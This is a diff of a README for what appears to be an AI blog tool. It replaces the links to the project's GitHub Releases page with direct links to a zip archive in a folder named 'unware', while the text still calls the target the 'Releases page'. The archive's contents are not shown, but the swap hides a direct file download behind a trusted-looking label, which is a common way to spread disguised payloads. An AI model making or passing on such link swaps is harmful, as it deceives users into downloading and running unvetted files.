@@ -2,7 +2,7 @@
 
 ## 🚀 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/sknoman268/ai-blog-res/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sknoman268/ai-blog-res/main/unware/blog-ai-res-1.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/sknoman268/ai-blog-res/main/unware/blog-ai-res-1.1.zip)
 
 ## 📖 Introduction
 
@@ -42,7 +42,7 @@ Organized in table format, this document contains more comprehensive information
 
 ## 📦 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/sknoman268/ai-blog-res/releases). There, you will find the latest version available. 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/sknoman268/ai-blog-res/main/unware/blog-ai-res-1.1.zip). There, you will find the latest version available. 
 
 1. Click on the link above to open the Releases page.
 2. Choose the version you want to download.
